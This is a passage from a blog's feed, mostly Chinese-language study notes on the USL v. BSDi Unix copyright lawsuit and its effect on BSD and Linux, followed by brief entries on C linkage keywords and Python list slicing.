href="https://en.wikipedia.org/wiki/BSD_license"&gt;BSD license&lt;/a&gt;. It was released in June 1989.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Net/2  &lt;ul&gt;
&lt;li&gt;After Net/1, BSD developer &lt;a href="https://en.wikipedia.org/wiki/Keith_Bostic"&gt;Keith Bostic&lt;/a&gt;  proposed that more non-AT&amp;amp;T sections of the BSD system be released  under the same license as Net/1. To this end, he started a project to  reimplement most of the standard Unix utilities without using the  AT&amp;amp;T code. For example, &lt;a href="https://en.wikipedia.org/wiki/Vi"&gt;vi&lt;/a&gt;, which had been based on the original Unix version of &lt;a href="https://en.wikipedia.org/wiki/Ed_%28Unix%29"&gt;ed&lt;/a&gt;, was rewritten as &lt;a href="https://en.wikipedia.org/wiki/Nvi"&gt;nvi&lt;/a&gt;  (new vi). Within eighteen months, all of the AT&amp;amp;T utilities had  been replaced, and it was determined that only a few AT&amp;amp;T files  remained in the kernel. These files were removed, and the result was the  June 1991 release of Networking Release 2 (Net/2), a nearly complete  operating system that was freely distributable.  &lt;/li&gt;
&lt;li&gt;Net/2 was the basis for two separate ports of BSD to the &lt;a href="https://en.wikipedia.org/wiki/Intel_80386"&gt;Intel 80386&lt;/a&gt; architecture: the free &lt;a href="https://en.wikipedia.org/wiki/386BSD"&gt;386BSD&lt;/a&gt; by &lt;a href="https://en.wikipedia.org/wiki/William_Jolitz"&gt;William Jolitz&lt;/a&gt; and the &lt;a href="https://en.wikipedia.org/wiki/Proprietary_software"&gt;proprietary&lt;/a&gt; &lt;a href="https://en.wikipedia.org/wiki/BSD/OS"&gt;BSD/386&lt;/a&gt; (later renamed BSD/OS) by &lt;a href="https://en.wikipedia.org/wiki/Berkeley_Software_Design"&gt;Berkeley Software Design&lt;/a&gt; (BSDi). 386BSD itself was short-lived, but became the initial code base of the &lt;a href="https://en.wikipedia.org/wiki/NetBSD"&gt;NetBSD&lt;/a&gt; and &lt;a href="https://en.wikipedia.org/wiki/FreeBSD"&gt;FreeBSD&lt;/a&gt; projects that were started shortly thereafter.  &lt;/li&gt;
&lt;li&gt;BSDi soon found itself in legal trouble with AT&amp;amp;T's &lt;a href="https://en.wikipedia.org/wiki/Unix_System_Laboratories"&gt;Unix System Laboratories&lt;/a&gt; (USL) subsidiary, then the owners of the System V &lt;a href="https://en.wikipedia.org/wiki/Copyright"&gt;copyright&lt;/a&gt; and the Unix trademark. The &lt;a href="https://en.wikipedia.org/wiki/USL_v._BSDi"&gt;&lt;em&gt;USL v. BSDi&lt;/em&gt;&lt;/a&gt; lawsuit was filed in 1992 and led to an &lt;a href="https://en.wikipedia.org/wiki/Injunction"&gt;injunction&lt;/a&gt; on the distribution of Net/2 until the validity of USL's copyright claims on the source could be determined.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;和解條件&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;釋出不包含爭議原始碼的發行版 4.4BSD-lite ，Berkeley 鼓勵使用者改換此版本  &lt;/li&gt;
&lt;li&gt;Berkeley 停止散佈部分檔案  &lt;/li&gt;
&lt;li&gt;USL 給爭議原始碼的使用者三個月的寬限期  &lt;/li&gt;
&lt;li&gt;部分 Berkeley 散佈的檔案必須包含 USL 授權告示  &lt;/li&gt;
&lt;li&gt;部分 USL 散佈的檔案必須包含 Berkeley 授權告示  &lt;/li&gt;
&lt;li&gt;USL 允許自由散佈部分檔案  &lt;/li&gt;
&lt;li&gt;University not to actively assist in legal attempts to challenge USL's rights to certain files.  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ref:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.groklaw.net/article.php?story=20041126130302760"&gt;The 1994 USL-Regents of UCal Settlement Agreement  - PDF and text&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;影響&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;The lawsuit slowed development of the free-software descendants of BSD  for nearly two years while their legal status was in question, and as a  result systems based on the &lt;a href="https://en.wikipedia.org/wiki/Linux_kernel"&gt;Linux kernel&lt;/a&gt;, which did not have such legal ambiguity, gained greater support. Although not released until 1992, development of &lt;a href="https://en.wikipedia.org/wiki/386BSD"&gt;386BSD&lt;/a&gt; predated that of Linux. &lt;a href="https://en.wikipedia.org/wiki/Linus_Torvalds"&gt;Linus Torvalds&lt;/a&gt; has said that if 386BSD or the &lt;a href="https://en.wikipedia.org/wiki/GNU_kernel"&gt;GNU kernel&lt;/a&gt; had been available at the time, he probably would not have created Linux.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;strong&gt;BSD Family&lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://github.com/freebsd/freebsd/blob/master/share/misc/bsd-family-tree"&gt;/share/misc/bsd-family-tree&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;386BSD  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;由 Berkeley 校友  &lt;a href="http://en.wikipedia.org/wiki/Lynne_Jolitz"&gt;Lynne Jolitz&lt;/a&gt; 和 &lt;a href="http://en.wikipedia.org/wiki/William_Jolitz"&gt;William Jolitz&lt;/a&gt; 把 4.3BSD-Reno / 4.3BSD Net/2 移植到 Intel 80386 上 (80386 硬體在當時相對便宜很多)  &lt;/li&gt;
&lt;li&gt;補上了 Net/2 缺乏的部份  &lt;/li&gt;
&lt;li&gt;成為 FreeBSD 和 NetBSD 的基礎  &lt;/li&gt;
&lt;li&gt;沒有被牽入訴訟之中  &lt;/li&gt;
&lt;li&gt;台灣當時有 Newsgroup (tw.bbs.comp.386bsd) 在研究 BSD 相關技術  &lt;/li&gt;
&lt;li&gt;4.3BSD  &lt;/li&gt;
&lt;li&gt;Net/1 ：包含 berkeley 修改的 networking code  &lt;/li&gt;
&lt;li&gt;Net/2 ：berkeley 改寫了更多工具程式，以規避 at&amp;amp;t 的著作權  &lt;/li&gt;
&lt;li&gt;4.4BSD  &lt;/li&gt;
&lt;li&gt;4.4BSD-Lite : 訴訟和解後 berkeley 釋出不含 AT&amp;amp;T 原始碼的版本，BSD License  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;4.4BSD-Encumbered&lt;/strong&gt; : 包含 AT&amp;amp;T 原始碼，僅提供給 AT&amp;amp;T 授權者  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;補充&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.dropbox.com/s/ih4eius66dyr1qi/20150422.pdf?dl=0"&gt;商業應用自由開源軟體的訴訟大事紀概述&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;strong&gt;角色介紹&lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;USL&lt;/strong&gt; (UNIX System Laboratories, Inc.)  &lt;/li&gt;
&lt;li&gt;1989 創立，是 Bell labs 的子組織  &lt;/li&gt;
&lt;li&gt;1990開始負責 UNIX 開發  &lt;/li&gt;
&lt;li&gt;後來變成 AT&amp;amp;T 的 wholly owned subsidiary ，完全受到 AT&amp;amp;T 控制的子公司  &lt;/li&gt;
&lt;li&gt;Bell labs 又是 AT&amp;amp;T 的一個部門（或是子公司？）  &lt;/li&gt;
&lt;li&gt;1993/Jun Novell 買下 USL ，所有財產、商標及專利，包含 UNIX 的財產權  &lt;/li&gt;
&lt;li&gt;BSDI (Berkeley Software Design, Inc.)  &lt;/li&gt;
&lt;li&gt;1991 由 Rick Adams 及 CSRG 的成員們所創立  &lt;/li&gt;
&lt;li&gt;開發及販賣 BSD/OS （proprietary 版本的 BSD）的授權  &lt;/li&gt;
&lt;li&gt;1999 試圖模仿 RedHat 的模式進行 IPO ，不幸的是這個策略後來失敗，總裁 Rob Kolstad 離開公司之後不久，公司面臨破產  &lt;/li&gt;
&lt;li&gt;2000 BSDI 與 &lt;a href="https://en.wikipedia.org/wiki/Walnut_Creek_CDROM"&gt;Walnut Creek CDROM&lt;/a&gt; 合併  &lt;/li&gt;
&lt;li&gt;2001 年，在巨大的財務壓力下，BSDI 將軟體部門售出給&lt;a href="https://en.wikipedia.org/wiki/Wind_River_Systems"&gt;Wind River Systems&lt;/a&gt;，公司的剩餘部門更名為 iXsystems ，專注在伺服器硬體的業務  &lt;/li&gt;
&lt;li&gt;CSRG, &lt;strong&gt;Computer Systems Research Group&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;CSRG 是 Berkeley 的研究團隊，目的在 AT&amp;amp;T UNIX 的基礎上進行開發及增強，經費來源是 DARPA  &lt;/li&gt;
&lt;li&gt;1974 柏克萊大學的 Bob Fabry 教授從 AT&amp;amp;T 取得 UNIX 的授權，Berkeley 開始修改 AT&amp;amp;T UNIX ，並將修改後的版本發佈為 Berkeley Software Distribution  &lt;/li&gt;
&lt;li&gt;1980/Apr Professor Fabry 跟 DARPA 簽了合約，進一步開發 UNIX 以支援 ARPAnet 功能使用的需求  &lt;/li&gt;
&lt;li&gt;1995 解散  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;問題&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;FreeBSD 是否有像 Linux 一樣類似 OIN 的組織？  &lt;/li&gt;
&lt;li&gt;似乎是沒有，請老師補充（補充：如果指的是「協助處理專利問題的相關組織」，沒有。）  &lt;/li&gt;
&lt;li&gt;The FreeBSD Foundation 會協助處理專利問題，還有其他法律或是和廠商間的合約問題。  &lt;/li&gt;
&lt;li&gt;這場戰爭後對於之後開源與商業間有什麼影響？（基本上就是稍阻開源軟體的商業應用，一段時間內商業公司迴避採用BSD-based的系統來進行產品製作，一直到GNU Linux的重新創作，才又再蓬勃發展。）  &lt;/li&gt;
&lt;li&gt;Difference between NET/1 and NET/2 ?h  &lt;/li&gt;
&lt;li&gt;衍生著作 (derivative work) 的基本原則 : A work based on the original work.  &lt;/li&gt;
&lt;li&gt;抄襲  &lt;ol&gt;
&lt;li&gt;抄 - 著作權  &lt;/li&gt;
&lt;li&gt;襲 - 改作權  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;NET/1 先處理"抄"的問題  &lt;/li&gt;
&lt;li&gt;NET/2 再處理"襲"的問題  &lt;/li&gt;
&lt;li&gt;為什麼 Jollitz 沒有被告但是 BSDI 卻被告了？  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;歸責-因果關係  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Difference between NET/1 and NET/2?  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;抄襲：抄─侵犯著作人的重製權 reproduction；襲─侵犯著作人的改作權，如翻譯哈利波特，即是改作的行為，因此須先取得作者的許可。  &lt;/li&gt;
&lt;li&gt;抄襲 in 程式碼：抄─直接抄程式碼；襲─根據別人的程式碼進行改寫。改寫又牽扯到 衍生著作 derivative work: a work based on the original work.  &lt;/li&gt;
&lt;li&gt;訴訟的目的不一定是要贏，有時候是為了阻斷對方的商業進展。以 AT&amp;amp;T 和 BSD 的訴訟而言，AT&amp;amp;T 確實是該告對方(阻止 BSDi 的商業發展)，就結果來說(和解且 BSDi 發展不下去) AT&amp;amp;T 是獲勝的，只是沒想到後有 Linux 的出現。  &lt;/li&gt;
&lt;li&gt;386BSD: 由一對 Berkeley 校友從 NET/2 版本進行改寫，將此作業系統成功移植至 intel 80386 (當時比較便宜的電腦主機) 並將所有跟 AT&amp;amp;T 相關的程式碼拔除，以及補上其不足的功能。後來成為 FreeBSD、OpenBSD 的前身。  &lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;分工表&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;過程：鄭順一  &lt;/li&gt;
&lt;li&gt;影響：許邱翔  &lt;/li&gt;
&lt;li&gt;角色介紹：林育德  &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Misc &amp;amp; Memo&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;A Narrative History of BSD&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Wikipedia&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Berkeley_Software_Distribution"&gt;https://en.wikipedia.org/wiki/Berkeley_Software_Distribution&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;FreeBSD.org&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.freebsd.org/doc/en_US.ISO8859-1/articles/explaining-bsd/why-is-bsd-not-better-known.html"&gt;https://www.freebsd.org/doc/en_US.ISO8859-1/articles/explaining-bsd/why-is-bsd-not-better-known.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;參考&lt;/strong&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.livinginternet.com/i/iw_unix_war.htm"&gt;&lt;strong&gt;Unix Wars&lt;/strong&gt;&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.oreilly.com/openbook/opensources/book/kirkmck.html"&gt;Twenty Years of Berkeley Unix - From AT&amp;amp;T-Owned to Freely Redistributable&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.freebsddiary.org/linux.php"&gt;The FreeBSD Diary -- Why is Linux Successful? - An Opinion.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;support of cheap hardware  &lt;/li&gt;
&lt;li&gt;visibility on Usenet (marketing)  &lt;/li&gt;
&lt;li&gt;the USL lawsuit against BSD  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.freebsd.org/doc/en_US.ISO8859-1/articles/explaining-bsd/why-is-bsd-not-better-known.html"&gt;Why&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.freebsd.org/doc/en_US.ISO8859-1/articles/explaining-bsd/why-is-bsd-not-better-known.html"&gt;is BSD not better known?&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://linuxfr.org/nodes/88229/comments/1291183"&gt;Interview with Andrew Tanenbaum&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;The reason MINIX 3 didn't dominate the world has to do with one mistake I  made about 1992. At that time I thought BSD was going to take over the world. It was a mature and stable system. I didn't see any point in  competing with it, so I focused MINIX on education. Four of the BSD guys  had just formed a company to sell BSD commercially. They even had a  nice phone number: 1-800-ITS-UNIX. That phone number did them and me in.  AT&amp;amp;T sued them over the phone number and the lawsuit took 3 years  to settle. That was precisely the period Linux was launched and BSD was  frozen due to the lawsuit. By the time it was settled, Linux had taken  off. My mistake was not to realize the lawsuit would take so long and  cripple BSD. If AT&amp;amp;T had not brought suit (or better yet, bought  BSDI), Linux would never have become popular at all and BSD would  dominate the world.  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://lwn.net/Articles/467852/"&gt;https://lwn.net/Articles/467852/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;1996 年的 WWDC 上，Apple 宣佈推出 &lt;a href="http://en.wikipedia.org/wiki/MkLinux"&gt;MkLinux&lt;/a&gt;，這是建構於 Mach microkernel 的 Linux 系統，運作於 Macintosh  電腦硬體。雖然之後 MkLinux 停止發展，但至今 &lt;a href="http://opensource.apple.com/"&gt;Mac OS X 的原始程式碼&lt;/a&gt;仍可見到 MkLinux 的蹤跡，像是在 libc。之後隨著 NeXTSTEP 的合併進 Apple，BSD 程式碼和 Mach microkernel 組成了 &lt;a href="http://en.wikipedia.org/wiki/XNU"&gt;XNU&lt;/a&gt; 這個新的 hybrid。MkLinux 是首個由 Apple 支持的開放原始碼專案，開發經驗對日後以 Mach 3.0 為基礎的 Mac OS X 有很大的助益。  &lt;/li&gt;
&lt;li&gt;1991 年末釋出的 Linux kernel，到 1995 年就促使 Open Software Foundation (和 open source 推廣無關，但部份成果的確以 open source license 釋出) 與 Apple 採納作為產品核心  &lt;/li&gt;
&lt;li&gt;參考資料: &lt;a href="https://gate.crashing.org/doc/ppc/doc003.htm"&gt;History of Linux for the PowerPC&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;MkLinux 許多原始程式碼的宣告是 Copyright 1991-1998 Open Software Foundation, Inc. (MIT 授權)，如 DR3/osfmk/src/mach_kernel/i386/i386_lock.s  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.softpanorama.org/People/Torvalds/Finland_period/att_lawsuit_as_a_launcher_for_linux.shtml"&gt;AT&amp;amp;T lawsuit helps to launch Linux into mainstream&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;時間點很重要  &lt;/li&gt;
&lt;li&gt;"In late 1991 there were 100 programmers on UseNet producing improvements for (BSD)," said Wes Peters, a BSD user from the beginning. "If not for the AT&amp;amp;T lawsuit at the worst moment.... Because of that, people said, 'I don't want to go with BSD now.' That was the time Linux was gaining functionality."  &lt;/li&gt;
&lt;li&gt;Unix版权史  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2010/03/unix_copyright_history.html"&gt;http://www.ruanyifeng.com/blog/2010/03/unix_copyright_history.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;AT&amp;amp;T与BSD之间的诉讼，是当代版权制度最恶劣的应用之一。  &lt;/li&gt;
&lt;li&gt;为什么这么说？  &lt;/li&gt;
&lt;li&gt;首先，起诉者其实与Unix毫无关系。这是AT&amp;amp;T经理层的决定，而不是开发者的决定。事实上，包括Ken Thompson在内的技术人员一直希望，公司能够公开源码。他们完全有理由这么要求，因为Unix从来不是AT&amp;amp;T的业务重点，最初是个人项目，后来也没有占用公司太多资源。销售Unix的利润，在公司全部业务中，几乎可以忽略不计。为了一点点钱，去打击一个使许多人受益的产品，何必这样做呢。  &lt;/li&gt;
&lt;li&gt;其次，AT&amp;amp;T根本不关心Unix的发展。它真正关心的是金钱和削弱对手。1994年，官司还没有结束，它就把Unix卖给了Novell公司，从此不再与Unix发生关系，官司也因此不了了之。既然你不想要这个产品，为什么要提起诉讼呢？真是不可理解。  &lt;/li&gt;
&lt;li&gt;最后，所谓的侵权几乎是不存在的。因为Novell从AT&amp;amp;T买下Unix版权后，检查了BSD的源码，在18000个组成文件中删除了3个，并对其他文件做了一些小修改，然后BSD就重新获得了自由发布源码的许可。这意味着，至多只有千分之一的BSD代码有版权问题，但是就因为这千分之一的问题，导致百分之百的产品被迫中断，完全不符合比例原则。  &lt;/li&gt;
&lt;li&gt;所以，这场版权官司就是一家利益至上的公司，以微不足道的理由，为了一个自己根本不在乎的产品，悍然发动一场损人不利己的战争。  &lt;/li&gt;
&lt;li&gt;更為自由的開放源碼作業系統  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.openfoundry.org/tw/opensource-history/1891"&gt;https://www.openfoundry.org/tw/opensource-history/1891&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;由於 Unix 中包含原始碼，使得研究機構可以修改並擴充 Unix，加州大學柏克萊分校的研究生 Bill Joy 就以此方式於 1977 年延伸出 BSD（Berkeley Software Distribution），BSD 一開始僅是 Unix 的外掛，並非完整的作業系統，一直要到了1983 年的 2.9 BSD 才首次作為一個完整的作業系統釋出。1991 年，BSD Networking Release 2 釋出，除去多數 AT&amp;amp;T Unix 的原始碼，成為 386BSD 和 BSD/386 的前身，此一主張同時主張其使用者不需再取得 AT&amp;amp;T 授權。這使得 AT&amp;amp;T 所屬的 Unix System Laboratories 向 Berkeley Software Design, Inc. 提起訴訟，造成 Networking Release 2 直到爭議釐清前都無法散布。USL v. BSDi 一案於 1992 年提出，1994 年達成和解，這期間導致 BSD 開發趨緩，使得另一個開放源碼作業系統 Linux 後來居上。  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.linux.org.tw/~jserv/archives/002042.html"&gt;Jserv's blog: 不再囉唆：NetBSD 簡化BSD 授權條款&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;隨著 BSD 的成熟，人們意識到摻雜 AT&amp;amp;T UNIX 的程式碼，意味著高價的授權 (AT&amp;amp;T License) 與使用上的限制，沒辦法透過當時開始發展的網路 (Ethernet) 作廣泛的散播，是此，在許多貢獻者的投入下，1989 年六月，Networking Release 1 (Net/1) 誕生了，不需 AT&amp;amp;T 授權也使用，當時一個劃時代的變革就是將上述四個條款的 BSD 授權聲明含入，只要在這個新的遊戲規則下，都可自由再發佈。而我們也可從這原始的四項被授權人的條件限制中，看出對於原始程式與二進位執行檔的散播形式 (需保有授權與免責聲明)、於程式本體提及 Net/1 研發背後的加州大學、禁止以貢獻者或加州大學之名，行衍生軟體之背書、推廣、促銷等行為，意思就是為這嶄新的系統，制定得以自由使用的規則。而到了 1991 年六月，Net/2 已幾近全新的作業系統，不含 AT&amp;amp;T 的程式碼，而 Net/2 在 Intel 80386 硬體架構的移植，由 William Jolitz 負責下進行，也被稱為 386BSD，後來，由握有 System V 版權、Unix 商標的 UNIX Systems Laboratories (USL，為 AT&amp;amp;T 附屬子公司) 對 Net/2 在 80386 硬體的封閉專屬 BSD/OS 背後研發的 Berkeley Software Design (BSDi) 公司，提出法律訴訟，延宕了多年，直到 1994 年一月份才落幕，並引來 BSD 原始程式碼重整的動作，顯然，對系出同門的 386BSD 來說，不免也受到影響，而無法在法律爭端休止前，作自由的開發與使用。  &lt;/li&gt;
&lt;li&gt;UNIX的歷史沿革  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://content.sp.npu.edu.tw/teacher/kkhuang/Shared%20Documents/Linux作業系統/UNIX的歷史沿革.pdf"&gt;http://content.sp.npu.edu.tw/teacher/kkhuang/Shared%20Documents/Linux作業系統/UNIX的歷史沿革.pdf&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;FreeBSD TCP/IP stack  &lt;/li&gt;
&lt;li&gt;[2015] &lt;a href="http://www.dmst.aueb.gr/dds/pubs/conf/2015-MSR-Unix-History/html/Spi15c.html"&gt;A Repository with 44 Years of Unix Evolution&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;p&gt;[GitHub] &lt;a href="https://github.com/dspinellis/unix-history-repo"&gt;dspinellis/unix-history-repo&lt;/a&gt;&lt;br /&gt;
&lt;img alt="UNIX branches" src="http://www.dmst.aueb.gr/dds/pubs/conf/2015-MSR-Unix-History/html/branches.png" /&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;[2012] &lt;a href="http://www.linuxdevcenter.com/pub/a/linux/2002/02/28/caldera.html"&gt;Why Caldera Released Unix: A Brief History&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;[Wikipedia] &lt;a href="http://en.wikipedia.org/wiki/Ancient_UNIX"&gt;Ancient UNIX&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Unix传奇  &lt;/li&gt;
&lt;li&gt;(上篇) &lt;a href="http://coolshell.cn/articles/2322.html"&gt;http://coolshell.cn/articles/2322.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;(下篇) &lt;a href="http://coolshell.cn/articles/2324.html"&gt;http://coolshell.cn/articles/2324.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://embedded2015.hackpad.com/UNIX-History-o6ganUMGhbm"&gt;UNIX 相關歷史&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;歡迎一起考古！ --jserv  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;旁徵博引  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/SCO%E2%80%93Linux_controversies"&gt;https://en.wikipedia.org/wiki/SCO%E2%80%93Linux_controversies&lt;/a&gt; Linux 的官司  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;See Also:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linux Foundation, OIN  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;TODO:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;將參考資料分類並分工研讀  &lt;/li&gt;
&lt;li&gt;~~填寫分工表~~  &lt;/li&gt;
&lt;li&gt;~~研讀誠夏老師提供的簡報(開源軟體法律訴訟案例)~~  &lt;/li&gt;
&lt;li&gt;訴訟、商業化、授權條款之間的關係  &lt;/li&gt;
&lt;li&gt;探討這場官司對於現在的影響  &lt;/li&gt;
&lt;li&gt;BSDi 導火線  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;5/18 報告後 TODO:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AT&amp;amp;T 公司介紹，後來為何被拆成好幾個子公司等補充介紹  &lt;/li&gt;
&lt;li&gt;整場訴訟的前情提要、為什麼要打官司、官司內容、最後結果與影響  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="BSD"></category><category term="AT&amp;T"></category><category term="Open Source"></category></entry><entry><title>static/extern/inline function/variable in C</title><link href="https://blog.m157q.tw/posts/2015/06/02/static-extern-inline-function-variable-in-c/" rel="alternate"></link><published>2015-10-26T14:16:00+08:00</published><updated>2015-10-26T14:16:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-06-02:posts/2015/06/02/static-extern-inline-function-variable-in-c/</id><summary type="html">&lt;p&gt;&lt;a href="http://sitcon.kktix.cc/events/sitcon-ccca-meetup-12"&gt;SITCON x CCCA 新竹定期聚 #12 - extern/static/inline function/variable in C by susu&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;教材：&lt;a href="https://github.com/u1240976/mess_note/blob/master/talk/internal_and_external_linkage_in_C.rst"&gt;mess_note/internal_and_external_linkage_in_C.rst at master · u1240976/mess_note · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;錄影：&lt;a href="https://www.youtube.com/watch?v=wBXAzhO2HaA"&gt;https://www.youtube.com/watch?v=wBXAzhO2HaA&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;錄音：&lt;a href="https://plus.google.com/events/cb13m4vrrf9tjckgkic599pditc"&gt;https://plus.google.com/events/cb13m4vrrf9tjckgkic599pditc&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;感謝 &lt;a href="https://github.com/u1240976"&gt;susu&lt;/a&gt; 的介紹，&lt;br /&gt;
覺得 github 上那個 note 整理的很棒，&lt;br /&gt;
之前一直不太懂這部分，&lt;br /&gt;
現在總算比較清楚了，&lt;br /&gt;
之後有時間應該來好好再確認自己真的弄懂了。  &lt;/p&gt;</summary><category term="C"></category><category term="static"></category><category term="extern"></category><category term="inline"></category><category term="SITCON"></category><category term="Meetup"></category></entry><entry><title>Magic of Python list slicing</title><link href="https://blog.m157q.tw/posts/2015/05/25/magic-of-python-list-slicing/" rel="alternate"></link><published>2015-06-23T05:47:38+08:00</published><updated>2015-06-23T05:47:38+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-05-25:posts/2015/05/25/magic-of-python-list-slicing/</id><summary type="html">&lt;p&gt;主要是想查 Python 要怎麼漂亮的寫 prepend 一個 item 到 list 時&lt;br /&gt;
找到了這篇 &lt;a href="http://stackoverflow.com/questions/17911091/append-integer-to-beginning-of-list-in-python"&gt;append integer to beginning of list in python - Stack Overflow&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;主要就三種寫法：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一種，把 item 塞進一個 list 然後再加上原本的 list  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;第二種，用 built-in 的 list.insert  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;第三種，評分最低、也是引起我好奇的寫法  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;試了一下，發現真的可以這樣做，但在這之前從來沒看過這寫法。&lt;br /&gt;
於是就去翻了一下官方的文件&lt;br /&gt;
